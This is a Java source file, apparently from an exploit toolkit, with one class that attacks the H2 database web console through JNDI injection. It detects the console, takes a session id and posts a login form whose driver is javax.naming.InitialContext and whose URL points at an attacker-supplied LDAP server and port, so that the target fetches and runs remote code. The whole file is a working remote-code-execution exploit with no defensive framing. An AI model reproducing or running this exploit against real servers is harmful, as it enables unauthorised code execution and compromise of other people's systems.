package com.drops.exp;

import com.drops.exp.util.H2DatabaseUtil;
import com.drops.utils.HTTPUtils;

/**
 * @ClassName: H2DatabaseConsoleJNDIRCEEXP
 * @Description: TODO
 * @Author: Summer
 * @Date: 2021/7/30 9:56
 * @Version: v1.0.0
 * @Description:
 **/
public class H2DatabaseConsoleJNDIRCEEXP {


    public static boolean hasH2DatabaseConsoleJNDIRCE(String target,String vps, String port,boolean version) {
        String boby  = "language=en&setting=Generic+H2+(Embedded)&name=Generic+H2+(Embedded)&driver=javax.naming.InitialContext&url=ldap:/" + vps + ":" + port +"/#JNDIObject&user=&password=";

        if (version){
            if (H2DatabaseUtil.hasH2Database(target,version)){
                String path = H2DatabaseUtil.getJsessionid(target);
                if(HTTPUtils.postRequestV1(target,path,boby).getStatus() == 200){
                    return true;
                }
            }
        }else {
            if (H2DatabaseUtil.hasH2Database(target,version)){
                String path = H2DatabaseUtil.getJsessionid(target);
                if(HTTPUtils.postRequestV2(target,path,boby).getStatus() == 200){
                    return true;
                }
            }
        }


        return false;
    }
}
